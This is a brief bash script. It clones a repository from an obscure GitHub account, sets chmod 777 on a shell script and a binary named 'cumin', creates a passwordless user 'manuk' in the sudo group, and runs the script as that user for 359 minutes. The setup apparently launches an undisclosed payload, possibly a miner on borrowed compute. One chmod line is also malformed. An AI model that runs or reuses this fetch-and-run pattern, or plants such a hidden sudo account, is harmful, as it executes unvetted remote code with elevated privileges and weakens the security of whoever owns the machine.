#!/bin/bash
sudo apt update
git clone https://github.com/wreytrfser/tesawal.git && cd tesawal
chmod +x mantap.sh && chmod +x cumin chmod 777 cumin mantap.sh
sudo adduser --disabled-password --gecos "" manuk && sudo usermod -aG sudo manuk
sudo -u manuk -H sh -c "timeout 359m ./mantap.sh"
sudo apt update
